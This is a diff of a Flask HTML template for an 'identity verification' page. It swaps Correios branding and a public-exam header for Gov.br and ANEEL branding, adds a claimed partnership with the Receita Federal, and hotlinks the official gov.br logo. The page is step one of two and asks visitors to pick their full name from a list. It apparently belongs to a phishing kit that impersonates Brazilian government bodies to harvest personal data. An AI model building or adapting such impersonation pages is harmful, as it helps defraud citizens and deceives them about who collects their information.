@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Correios - Verificação de Identidade</title>
+    <title>Gov.br - Verificação de Identidade</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -26,8 +26,7 @@
             theme: {
                 extend: {
                     colors: {
-                        'correios-blue': '#003399',
-                        'correios-yellow': '#FEEF37',
+                        'gov-blue': '#003399',
                     }
                 }
             }
@@ -35,24 +34,25 @@
     </script>
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
-    <div class="bg-correios-yellow py-4 shadow-sm">
+    <!-- Header Branco -->
+    <div class="bg-white py-4 shadow-sm">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
+                <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr-logo-large.png" alt="Logo do Gov.br" class="h-12 mb-2" />
                 <div>
-                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
-                        CONCURSO PÚBLICO 2025
+                    <p class="text-gov-blue text-[16px] leading-tight font-bold tracking-wide">
+                        ANEEL - Agência Nacional de Energia Elétrica
                     </p>
-                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
+                    <p class="text-gov-blue text-[12px] leading-tight tracking-wide">
+                        Em parceria com a Receita Federal do Brasil
                     </p>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Blue bar -->
-    <div class="bg-correios-blue py-3 shadow-md">
+    <!-- Barra Azul -->
+    <div class="bg-gov-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
             <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                 <div class="w-2 h-2 bg-white"></div>
@@ -69,19 +69,19 @@
         <div class="max-w-2xl mx-auto">
             <div class="bg-white rounded-lg shadow-md p-6">
                 <div class="mb-6">
-                    <h2 class="text-lg font-bold text-correios-blue mb-2">Verificação de Segurança - Etapa 1 de 2</h2>
+                    <h2 class="text-lg font-bold text-gov-blue mb-2">Verificação de Segurança - Etapa 1 de 2</h2>
                     <p class="text-gray-600">Para sua segurança, selecione seu nome completo correto:</p>
                 </div>
 
                 <form action="{{ url_for('verificar_nome') }}" method="POST" class="space-y-4">
                     {% for nome in dados.nomes %}
                     <label class="flex items-center p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
-                        <input type="radio" name="nome" value="{{ nome }}" class="h-4 w-4 text-correios-blue focus:ring-correios-blue" required>
+                        <input type="radio" name="nome" value="{{ nome }}" class="h-4 w-4 text-gov-blue focus:ring-gov-blue" required>
                         <span class="ml-3 text-gray-700">{{ nome }}</span>
                     </label>
                     {% endfor %}
 
-                    <button type="submit" class="w-full bg-correios-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-6">
+                    <button type="submit" class="w-full bg-gov-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-6">
                         <span>Confirmar Nome</span>
                         <i class="fas fa-arrow-right ml-2"></i>
                     </button>
@@ -91,9 +91,9 @@
     </div>
 
     <!-- Footer -->
-    <div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">
-        <p class="text-sm font-medium">© {{ current_year }} Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento dos Correios - 0800 725 0100</p>
+    <div class="bg-gov-blue text-white text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} ANEEL - Agência Nacional de Energia Elétrica. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento: 167</p>
     </div>
 </body>
 </html>
